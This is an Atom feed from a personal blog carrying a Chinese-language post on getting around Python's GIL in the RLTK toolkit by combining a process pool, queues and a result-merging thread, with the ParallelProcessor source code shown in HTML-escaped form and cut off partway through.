<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>YYX's WEBlog</title><link href="http://blog.yyx.me/" rel="alternate"></link><link href="http://blog.yyx.me/feeds/all.atom.xml" rel="self"></link><id>http://blog.yyx.me/</id><updated>2018-08-28T05:50:00-07:00</updated><entry><title>一种Python中模拟多线程计算的方案</title><link href="http://blog.yyx.me/posts/a-solution-of-simulating-real-multithreading-in-python.html" rel="alternate"></link><published>2018-08-28T05:50:00-07:00</published><updated>2018-08-28T05:50:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2018-08-28:/posts/a-solution-of-simulating-real-multithreading-in-python.html</id><summary type="html">&lt;p&gt;Python中由于全局锁(GIL)的限制无法使多线程在运算密集场景下发挥其威力，本文探讨一个通过多线程和多进程配合的方案来“突破”这种限制。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;问题场景&lt;/h1&gt;
&lt;p&gt;Python并发编程绕不开&lt;a href="https://docs.python.org/3.6/glossary.html#term-global-interpreter-lock"&gt;全局锁(GIL)&lt;/a&gt;的问题。简单来说，GIL保证了一段时间内只允许一个真实的thread运行。网上有大量关于这个问题的历史成因的解释及性能瓶颈的测试结果。总结来说，当程序为IO密集型的时候，多线程其实也还是个不错的方案，但如果是运算密集型的情况下，CPU的资源就不能很好的分配和利用了。&lt;/p&gt;
&lt;p&gt;在最近实验室的项目中，需要开发一个针对Entity Resolution问题的包，我们叫它&lt;a href="https://github.com/usc-isi-i2/rltk"&gt;Record Linkage ToolKit (RLTK)&lt;/a&gt;。在使用RLTK的时候，很多依赖包或者是用户代码都是线程不安全的；于此同时，RLTK的使用场景不允许进行输入文件的预先切割然后并行的跑几个不同的进程。&lt;/p&gt;
&lt;p&gt;针对这些问题，我在RLTK的实现中给出了一个通用的方案。&lt;/p&gt;
&lt;h1&gt;实现方案&lt;/h1&gt;
&lt;p&gt;最直观的代替多线程的方案就是多进程，但是多进程的优缺点也很明显：优点当然是内存的独立互不影响，这也是为何Chrome需要一个tab一个进程；缺点也是内存空间的独立（好一把双刃剑），数据交换繁琐，于是就诞生了各种IPC技术）。&lt;/p&gt;
&lt;p&gt;RLTK的使用场景归纳后其实就是：开始-&amp;gt;单线程-&amp;gt;并发/并行-&amp;gt;单线程-&amp;gt;并发/并行-&amp;gt;...-&amp;gt;单线程-&amp;gt;结束。注意此处我没有区别并发(Concurrent)和并行(Parallel)这两个完全不同的概念，是因为此处我的目的无非就是通过某种手段实现CPU资源的最大化利用。&lt;/p&gt;
&lt;p&gt;在这个场景中，“并发/并行”可以看成一组并行的运算作业 (RLTK中主要是算Feature Vector)，运算期间各个单元是独立的（即在运算过程中不需要数据交互），如果每个作业单元的输入为&lt;code&gt;input[i]&lt;/code&gt;输出单元为&lt;code&gt;output[i]&lt;/code&gt;，则问题模型可以抽象成&lt;code&gt;output[i]=F(input[i])&lt;/code&gt;，其中的并行部分无非就是一个黑盒函数&lt;code&gt;F&lt;/code&gt;。因此无非就是在必要的时候把数据切割成多份然后丢入进程池去并行运行。&lt;/p&gt;
&lt;p&gt;这之后还需要解决的问题就是输出的返回。最简单的方案当然就是直接输出到不同的文件中，之后程序主线程等待运算结束后统一读取并合并结果，但这样的坏处是额外的磁盘IO的开销。因此方案变成，主进程中再创建一条副线程专门用于output的合并，主线程需要等所有子进程和副线程退出后才能继续执行下去。数据的输入和输出通过Queue进行交换。时间线如下：&lt;/p&gt;
&lt;p&gt;&lt;img alt="timeline" src="../statics/a-solution-of-simulating-real-multithreading-in-python/timeline.png"&gt;&lt;/p&gt;
&lt;p&gt;注意主进程中两个线程将由CPU调配交替运行，子进程中均只有各自的主线程因此无线程切换。这个设计在使用的时候需要将运算尽可能的在子进程中完成，主进程的子线程仅仅负责运算结果的获取和合并。&lt;/p&gt;
&lt;p&gt;具体代码实现 (&lt;a href="https://github.com/usc-isi-i2/rltk/blob/2edd0e4754b39336dd140f16404a03dcc9a5710a/rltk/parallel_processor.py"&gt;github&lt;/a&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;multiprocessing&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;mp&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;threading&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;queue&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;typing&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Callable&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;OutputThread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Handle output in main process.&lt;/span&gt;
&lt;span class="sd"&gt;    Create a thread and call ParallelProcessor.get_output().&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;instance&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;output_handler&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="nb"&gt;super&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;OutputThread&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_handler&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;output_handler&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;instance&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;instance&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;instance&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_output&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_handler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ParallelProcessor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Args:&lt;/span&gt;
&lt;span class="sd"&gt;        input_handler (Callable): Computational function. &lt;/span&gt;
&lt;span class="sd"&gt;        num_of_processor (int): Number of processes to use. &lt;/span&gt;
&lt;span class="sd"&gt;        max_size_per_input_queue (int): Maximum size of input queue for one process.&lt;/span&gt;
&lt;span class="sd"&gt;                                    If it&amp;#39;s full, the corresponding process will be blocked.&lt;/span&gt;
&lt;span class="sd"&gt;                                    0 by default means unlimited.&lt;/span&gt;
&lt;span class="sd"&gt;        max_size_per_output_queue (int): Maximum size of output queue for one process.&lt;/span&gt;
&lt;span class="sd"&gt;                                    If it&amp;#39;s full, the corresponding process will be blocked.&lt;/span&gt;
&lt;span class="sd"&gt;                                    0 by default means unlimited.&lt;/span&gt;
&lt;span class="sd"&gt;        output_handler (Callable): If the output data needs to be get in main process (another thread), &lt;/span&gt;
&lt;span class="sd"&gt;                                set this handler, the arguments are same to the return from input_handler.&lt;/span&gt;
&lt;span class="sd"&gt;                                The return result is one by one, order is arbitrary.&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="c1"&gt;# Command format in queue. Represent in tuple.&lt;/span&gt;
    &lt;span class="c1"&gt;# The first element of tuple will be command, the rests are arguments or data.&lt;/span&gt;
    &lt;span class="c1"&gt;# (CMD_XXX, args...)&lt;/span&gt;
    &lt;span class="n"&gt;CMD_DATA&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="n"&gt;CMD_STOP&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;input_handler&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Callable&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;num_of_processor&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                 &lt;span class="n"&gt;max_size_per_input_queue&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;max_size_per_output_queue&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                 &lt;span class="n"&gt;output_handler&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Callable&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;num_of_processor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;num_of_processor&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;input_queues&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;mp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;maxsize&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;max_size_per_input_queue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num_of_processor&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_queues&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;mp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;maxsize&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;max_size_per_output_queue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num_of_processor&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;processes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;mp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;input_queues&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_queues&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
                          &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num_of_processor&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;input_handler&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;input_handler&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_handler&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;output_handler&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;input_queue_index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_queue_index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

        &lt;span class="c1"&gt;# output can be handled in each process or in main process after merging (output_handler needs to be set)&lt;/span&gt;
        &lt;span class="c1"&gt;# if output_handler is set, output needs to be handled in main process; otherwise, it assumes there&amp;#39;s no output.&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;output_handler&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_thread&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;OutputThread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;output_handler&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;        Start processes and threads.&lt;/span&gt;
&lt;span class="sd"&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_handler&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_thread&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;processes&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;        Block until processes and threads return.&lt;/span&gt;
&lt;span class="sd"&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;processes&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_handler&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_thread&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;task_done&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;        Indicate that all resources which need to compute are added to processes.&lt;/span&gt;
&lt;span class="sd"&gt;        (main process, blocked)&lt;/span&gt;
&lt;span class="sd"&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;q&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;input_queues&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ParallelProcessor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CMD_STOP&lt;/span&gt;&lt;span class="p"&gt;,))&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;compute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;        Add data to one of the input queues.&lt;/span&gt;
&lt;span class="sd"&gt;        (main process, unblocked, using round robin to find next available queue)&lt;/span&gt;
&lt;span class="sd"&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;input_queues&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;input_queue_index&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;input_queue_index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;input_queue_index&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;num_of_processor&lt;/span&gt;
            &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;q&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put_nowait&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ParallelProcessor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CMD_DATA&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt;  &lt;span class="c1"&gt;# put in&lt;/span&gt;
            &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Full&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;continue&lt;/span&gt;  &lt;span class="c1"&gt;# find next available&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;idx&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;input_queue&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;mp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;output_queue&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;mp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;        Process’s activity. It handles queue IO and invokes user&amp;#39;s input handler.&lt;/span&gt;
&lt;span class="sd"&gt;        (subprocess, blocked, only two queues can be used to communicate with main process)&lt;/span&gt;
&lt;span class="sd"&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;input_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;ParallelProcessor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CMD_STOP&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="c1"&gt;# print(idx, &amp;#39;stop&amp;#39;)&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output_handler&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;output_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ParallelProcessor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CMD_STOP&lt;/span&gt;&lt;span class="p"&gt;,))&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt;
            &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;ParallelProcessor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CMD_DATA&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
